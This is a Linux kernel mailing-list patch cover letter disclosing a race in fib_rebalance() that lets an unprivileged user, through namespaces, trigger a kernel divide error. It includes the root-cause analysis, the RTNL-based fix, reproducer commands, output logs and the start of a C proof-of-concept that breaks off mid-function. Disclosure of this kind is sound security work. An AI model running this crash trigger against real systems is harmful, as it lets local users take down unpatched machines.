Received: from mail-pf1-f178.google.com (mail-pf1-f178.google.com [209.85.210.178])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 459FD42F70D
	for <netdev@vger.kernel.org>; Mon, 17 Aug 2026 13:12:27 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.210.178
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1786972352; cv=none; b=hqMo4JbxBEuWnVcpboFMQjoJNlxaah+TNQcBX1iFgygzd/nFA5VbzVMZZk/NZA0a7WLbShnuR/M0BHQmJQkpBz44bkRn98o5JGBSA5EL/PUN4BqY93uxXa2Yul1W7DG5kbioCuk9SyimyzXFADiLvvLcDfg+1o0HQoMd86MofD4=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1786972352; c=relaxed/simple;
	bh=kvfwiOI3fE1rb/Xy67mVj7ny0n1irT3fausIjYkuvtY=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=A6KB09EjS7FO7A/Xy+Hq2rF96ICt72eL0T666v+oIyA1ZONkKzTl9mgyndKXZQaBs726CTuETTk+6jkZUM1+TyyAVOg/7gbt9gzMKnEa4y3HnyRN+SZLEDpZC4AQ7/kwQkmyRMrQK7VlqHsSGNezLa6rWCB5nLRCH3tijc88k+o=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=XHFYvGLR; arc=none smtp.client-ip=209.85.210.178
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="XHFYvGLR"
Received: by mail-pf1-f178.google.com with SMTP id d2e1a72fcca58-84a4d8fd6ecso3404551b3a.1
        for <netdev@vger.kernel.org>; Mon, 17 Aug 2026 06:12:27 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1786972347; x=1787577147; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=VZglVl3JcSvekIeKjtaminBk0KvoxYcptKbb8DxhOsE=;
        b=XHFYvGLRs/vh2uzRWt3sxkiLPpOUIEGGLtKKV/ZH0GF3wfxz+vXA/G8TdeQCSKHkge
         8J3E0TrJFfHMPw8YuA6nrg/ULyhgddPqW+l9L5FyWyyYHSqnq2vYs4peE5gle/6yExd+
         IAJf3GZ5ZNX2EnpBOXSeM7jb+xefjlaInAS7h3DiInz3URFU4tJN1yJICfCJYIYUGZaK
         C785uMWZXTWS6yXSHaa+8DJto/yndLJUnTDax64TqSf0qfnj2eFV/CenWZxcMEMyhcjZ
         U9f4UAWBaub6DsLYix+7MoP/EALPXyzNd6uT0KG/ajhZxmK/+xltl/L4cn0fIL/13fT7
         E49A==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1786972347; x=1787577147;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=VZglVl3JcSvekIeKjtaminBk0KvoxYcptKbb8DxhOsE=;
        b=lMIJFgAs5c8z1uyFxqR4vK25CXH0wkNw+g8MBu9QVsUuOWZUg7apDgFBhJaTX+kme4
         7L+4ja02mxcBv0aQXKY/DZsz/uEvN0EEvCVqfsLTxL7sqImw9ROerJ64LQf5tkKoP93v
         HKUw7Mge68Ae+Z7hjLOWZew7USJ812gDtKtxnnpcllcsw2uLwaNu+qA7CmQgoCoUAdjt
         nOujdMUAHinXZNqVkHYZyjIn6TCxjlaniiBrRqCGtuUO7I8yfQRedwXjwA1KJ6xNPuGU
         QkcoC3VSf7xZnI5FcbxGt75NAU+z51BpcM2FlOXBZsSqtzR5FR0T7wnS66KVxLtK7qOz
         Dkiw==
X-Gm-Message-State: AOJu0YxgrkhD57DIDjT9GGN6ntaDBSOQvMHhBS22a20WD8a3e0sH48aK
	keh+ATHb0hy1pRyttNVC6xwkf19o2oKqXrNBU1/+rrFUlJBXbNyfyy/EM13T6DBT0tLiy8Q0XAI
	cPtHGgeBuhzs=
X-Gm-Gg: AR+sD13dfcEVq9WSZGHPSmiMT/Yal/1nN93DhJDJNceW1Oxj6Wm8U36psLssXVm4jbP
	junW3n50WH6gDZK7FZsolHfYxSfs2vj8NIf4qbVzwS3zB6pi0rKkNOPWOce0UHpwCvoAQm9AF5g
	E89Uf8juTs+HgRb2zmG/ZB4yVu0QN9XvF4SgZCI0p3MBgymYHz7WKM6MTz1s+P01o3SMsBpsz5I
	T0n6ncw2SSVEiOIQ20AIzA3X6VQq+wfP3hRYYbJvt1/hPIQUBsolqye6PNFqlE0ocjVDDyiRaBj
	XOlIBZromLHUkw2Jya0gDRn+7bHCw1NLTBjntOBt5t1WIZRzKwcl4fn5gMNd8WB2+ZRruJ6/c+3
	e2ag/V7e4UzjdFER/oU3FiHrld7TZfZMashK6jYCU12blElQUsvVSq+aBK4sozMHdyopgcKCz0R
	o/MOTn3FBYbZjuDD6uUpnTvbLO2rKMm3L26TZSM6EzphY6/65SG0JrZHFQYsY=
X-Received: by 2002:a05:6a00:f8b:b0:84a:2e5f:d69c with SMTP id d2e1a72fcca58-84fde396e23mr27241581b3a.32.1786972346576;
        Mon, 17 Aug 2026 06:12:26 -0700 (PDT)
Received: from gmail.com ([115.196.71.116])
        by smtp.gmail.com with ESMTPSA id d2e1a72fcca58-851b6fefb3asm261312b3a.53.2026.08.17.06.12.22
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Mon, 17 Aug 2026 06:12:25 -0700 (PDT)
From: Zihan Xi <zihanx@nebusec.ai>
To: netdev@vger.kernel.org
Cc: horms@kernel.org,
	davem@davemloft.net,
	pch@ordbogen.com,
	linux-kernel@vger.kernel.org,
	Zihan Xi <zihanx@nebusec.ai>
Subject: [PATCH net 0/1] ipv4: Fix fib_rebalance() divide-by-zero race
Date: Mon, 17 Aug 2026 13:12:09 +0000
Message-ID: <cover.1786812660.git.zihanx@nebusec.ai>
X-Mailer: git-send-email 2.47.3
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated an issue in net/ipv4/fib_semantics.c. The bug is reachable by a
non-root user via user and net namespace.
We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

The fault executes in fib_rebalance() in net/ipv4/fib_semantics.c. It makes
two passes over a multipath route: the first sums usable nexthop weights,
while the second calculates their hash upper bounds. Both passes
independently read the per-device ignore_routes_with_linkdown policy.

Route insertion and link-state updates execute fib_rebalance() under
RTNL, but the IPv4 sysctl handler can change this policy without RTNL.
If every nexthop is link-down, a 1-to-0 policy change between the two
passes leaves the first-pass total at zero and lets the second pass use
the same nexthops, causing a divide error.

The underlying root-cause fact first appeared in commit 0e884c78ee19
("ipv4: L3 hash-based multipath"), which introduced the two-pass hash
threshold calculation. Later changes refactored the nexthop accessors
but retained the same unlocked policy reads, so Fixes points to the
earliest commit that made this race possible.

The patch serializes ignore_routes_with_linkdown sysctl writes with the
per-net RTNL lock. Netlink devconf updates already use RTNL, so all
runtime policy writers are now mutually exclusive with every
fib_rebalance() trigger path. Thus the synchronization repair is in
net/ipv4/devinet.c, at the mutable sysctl writer, rather than in the
faulting calculation in net/ipv4/fib_semantics.c. The change adds no work
to route lookup or rebalance paths.

The fix relies on the existing fib_rebalance() caller contract: route
insertion and netdevice link-state callers hold the per-net RTNL lock.
Any future caller must preserve that contract before invoking
fib_rebalance().

The crash log below is the decoded output from the matching unpatched
comparison kernel built from 24ef02f934ee ("net: page_pool: fix UAF in
__page_pool_release_netmem_dma on xa_cmpxchg race"). Its release string is
7.2.0-rc7-unfixed-24ef02f934ee+, and the fix commit 2080e22819c5 is not
present in that kernel. The historical 6.12.95 reproduction remains
separate; its exact vmlinux and source tree are unavailable here.

The PoC explicitly leaves the veth peer v1 administratively down before
bringing v0 up. This leaves v0 UP with no carrier, so all 200 nexthops are
marked RTNH_F_LINKDOWN. The captured state confirms v1 DOWN and v0
NO-CARRIER,UP, and the route dump contains 200 linkdown nexthops.
The route_linkdown_count is 201 because its grep also counts the route
header.

On the patched 2080e22819c5 kernel, the same static PoC completed for both
root and an unprivileged user in a user and network namespace without an
Oops, divide error, panic, or fib_rebalance marker. The fixed-kernel root
run retained the 200-nexthop linkdown route after the PoC completed.

This patch does not trigger a rebalance of already-installed multipath
routes when the sysctl changes. Existing upper bounds are still recomputed
by the existing route-insertion and netdevice link-state paths; a sysctl
write alone does not immediately recompute them. That pre-existing
immediate-semantics behavior is unchanged; this patch only serializes the
policy write with those rebalance paths.

Reproducer:

    gcc -O2 -static -o poc poc.c
    unshare -Urn ./poc

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
The default timeout is 30 seconds; the PoC prints its configuration and
completion status before exiting. POC_TIMEOUT accepts 1 through 86400
seconds.

Complete PoC output from the patched kernel (root):

    nh_count=200 on_usec=200 off_usec=50 route_cpu=0 toggle_cpu=1 timeout=30
    completed: worker threads stopped

Complete PoC output from the patched kernel (unprivileged user namespace):

    nh_count=200 on_usec=200 off_usec=50 route_cpu=0 toggle_cpu=1 timeout=30
    completed: worker threads stopped

Output from the unpatched comparison before the divide-error Oops:

    nh_count=200 on_usec=200 off_usec=50 route_cpu=0 toggle_cpu=1 timeout=30

The following post-run veth and route dump is copied verbatim from the
patched root run:

----BEGIN veth/linkdown state----

links:
v0@v1            LOWERLAYERDOWN da:80:b2:58:92:fb <NO-CARRIER,BROADCAST,MULTICAST,UP,M-DOWN> 
v1@v0            DOWN           da:82:c8:57:15:c2 <BROADCAST,MULTICAST> 
route_linkdown_count:
201
route:
198.51.100.1 linkdown 
	nexthop via 10.0.0.2 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.3 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.4 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.5 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.6 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.7 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.8 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.9 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.10 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.11 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.12 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.13 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.14 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.15 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.16 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.17 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.18 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.19 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.20 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.21 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.22 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.23 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.24 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.25 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.26 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.27 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.28 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.29 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.30 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.31 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.32 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.33 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.34 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.35 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.36 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.37 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.38 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.39 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.40 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.41 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.42 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.43 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.44 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.45 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.46 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.47 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.48 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.49 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.50 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.51 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.52 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.53 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.54 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.55 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.56 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.57 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.58 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.59 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.60 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.61 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.62 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.63 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.64 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.65 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.66 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.67 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.68 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.69 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.70 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.71 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.72 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.73 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.74 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.75 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.76 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.77 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.78 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.79 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.80 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.81 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.82 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.83 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.84 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.85 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.86 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.87 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.88 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.89 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.90 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.91 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.92 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.93 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.94 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.95 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.96 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.97 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.98 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.99 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.100 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.101 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.102 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.103 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.104 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.105 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.106 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.107 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.108 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.109 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.110 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.111 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.112 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.113 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.114 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.115 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.116 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.117 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.118 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.119 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.120 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.121 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.122 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.123 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.124 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.125 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.126 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.127 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.128 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.129 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.130 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.131 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.132 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.133 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.134 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.135 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.136 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.137 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.138 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.139 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.140 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.141 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.142 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.143 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.144 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.145 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.146 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.147 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.148 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.149 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.150 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.151 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.152 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.153 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.154 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.155 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.156 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.157 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.158 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.159 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.160 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.161 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.162 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.163 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.164 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.165 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.166 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.167 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.168 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.169 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.170 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.171 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.172 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.173 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.174 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.175 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.176 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.177 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.178 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.179 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.180 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.181 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.182 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.183 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.184 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.185 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.186 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.187 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.188 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.189 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.190 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.191 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.192 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.193 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.194 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.195 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.196 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.197 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.198 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.199 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.200 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.201 dev v0 weight 1 onlink linkdown 

-----END veth/linkdown state-----

------BEGIN poc.c------

#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <net/if.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#define DEV0 "v0"
#define DEV1 "v1"
#define DEV0_ADDR "10.0.0.1/24"
#define SYSCTL_PATH "/proc/sys/net/ipv4/conf/" DEV0 "/ignore_routes_with_linkdown"

#define DEFAULT_NH_COUNT 200U
#define DEFAULT_ON_USEC 200U
#define DEFAULT_OFF_USEC 50U
#define DEFAULT_TIMEOUT 30U

#define MAX_MP_BUF 8192
#define MAX_ROUTE_REQ 16384

static volatile sig_atomic_t stop_flag;

struct config {
	unsigned int nh_count;
	unsigned int on_usec;
	unsigned int off_usec;
	unsigned int timeout_sec;
	int route_cpu;
	int toggle_cpu;
};

struct route_state {
	int fd;
	size_t msg_len;
	struct nlmsghdr *nlh;
	uint32_t *dst;
};

static void die(const char *fmt, ...)
{
	va_list ap;

	va_start(ap, fmt);
	vfprintf(stderr, fmt, ap);
	va_end(ap);
	fputc('\n', stderr);
	exit(EXIT_FAILURE);
}

static unsigned int env_u32(const char *name, unsigned int def, unsigned int min,
			       unsigned int max)
{
	char *end = NULL;
	const char *value = getenv(name);
	unsigned long parsed;

	if (!value || !*value)
		return def;

	errno = 0;
	parsed = strtoul(value, &end, 0);
	if (errno || !end || *end || parsed < min || parsed > max)
		die("invalid %s value: %s", name, value);

	return (unsigned int)parsed;
}

static int env_i32(const char *name, int def, int min, int max)
{
	char *end = NULL;
	const char *value = getenv(name);
	long parsed;

	if (!value || !*value)
		return def;

	errno = 0;
	parsed = strtol(value, &end, 0);
	if (errno || !end || *end || parsed < min || parsed > max)
		die("invalid %s value: %s", name, value);

	return (int)parsed;
}

static void load_config(struct config *cfg)
{
	memset(cfg, 0, sizeof(*cfg));
	cfg->nh_count = env_u32("POC_NH_COUNT", DEFAULT_NH_COUNT, 2, 240);
	cfg->on_usec = env_u32("POC_ON_USEC", DEFAULT_ON_USEC, 1, 1000000);
	cfg->off_usec = env_u32("POC_OFF_USEC", DEFAULT_OFF_USEC, 1, 1000000);
	cfg->timeout_sec = env_u32("POC_TIMEOUT", DEFAULT_TIMEOUT, 1, 86400);
	cfg->route_cpu = env_i32("POC_ROUTE_CPU", 0, 0, 1024);
	cfg->toggle_cpu = env_i32("POC_TOGGLE_CPU", 1, 0, 1024);
}

static void run_cmd(const char *fmt, ...)
{
	char cmd[512];
	va_list ap;
	int rc;

	va_start(ap, fmt);
	vsnprintf(cmd, sizeof(cmd), fmt, ap);
	va_end(ap);

	rc = system(cmd);
	if (rc == -1)
		die("system(%s) failed: %s", cmd, strerror(errno));
	if (!WIFEXITED(rc) || WEXITSTATUS(rc) != 0)
		die("command failed (%d): %s", rc, cmd);
}

static void set_affinity(int cpu)
{
	cpu_set_t set;

	CPU_ZERO(&set);
	CPU_SET(cpu, &set);
	if (sched_setaffinity(0, sizeof(set), &set) != 0)
		fprintf(stderr, "warning: sched_setaffinity(cpu=%d) failed: %s\n",
			cpu, strerror(errno));
}

static void spin_usec(unsigned int usec)
{
	struct timespec start, now;
	unsigned long long elapsed;

	if (!usec)
		return;

	if (clock_gettime(CLOCK_MONOTONIC, &start) != 0)
		return;

	for (;;) {
		if (clock_gettime(CLOCK_MONOTONIC, &now) != 0)
			return;

		elapsed = (unsigned long long)(now.tv_sec - start.tv_sec) * 1000000ULL;
		elapsed += (unsigned long long)(now.tv_nsec - start.tv_nsec) / 1000ULL;
		if (elapsed >= usec)
			return;
		asm volatile("" ::: "memory");
	}
}

static void write_sysctl_value(int fd, char value)
{
	char buf[2] = { value, '\n' };

	if (lseek(fd, 0, SEEK_SET) < 0)
		die("lseek(%s) failed: %s", SYSCTL_PATH, strerror(errno));
	if (write(fd, buf, sizeof(buf)) != (ssize_t)sizeof(buf))
		die("write(%s=%c) failed: %s", SYSCTL_PATH, value, strerror(errno));
}

static int addattr_l(struct nlmsghdr *nlh, size_t maxlen, uint16_t type,
		     const void *data, size_t alen)
{
	size_t len = RTA_LENGTH(alen);
	size_t newlen = NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(len);
	struct rtattr *rta;

	if (newlen > maxlen)
		return -1;

	rta = (struct rtattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
	rta->rta_type = type;
	rta->rta_len = len;
	if (alen)
		memcpy(RTA_DATA(rta), data, alen);
	nlh->nlmsg_len = newlen;
	return 0;
}

static size_t build_multipath(char *buf, size_t buflen, int ifindex,
			      unsigned int nh_count)
{
	size_t off = 0;
	unsigned int i;

	for (i = 0; i < nh_count; i++) {
		size_t nh_start = off;
		struct rtnexthop *rtnh;
		struct rtattr *gw;
		uint32_t gw_addr = htonl(0x0a000000U | (i + 2));

		if (off + RTNH_ALIGN(sizeof(*rtnh)) + RTA_SPACE(sizeof(gw_addr)) > buflen)
			die("multipath buffer too small");

		rtnh = (struct rtnexthop *)(buf + off);
		memset(rtnh, 0, sizeof(*rtnh));
		rtnh->rtnh_ifindex = ifindex;
		rtnh->rtnh_flags = RTNH_F_ONLINK;
		off += RTNH_ALIGN(sizeof(*rtnh));

		gw = (struct rtattr *)(buf + off);
		gw->rta_type = RTA_GATEWAY;
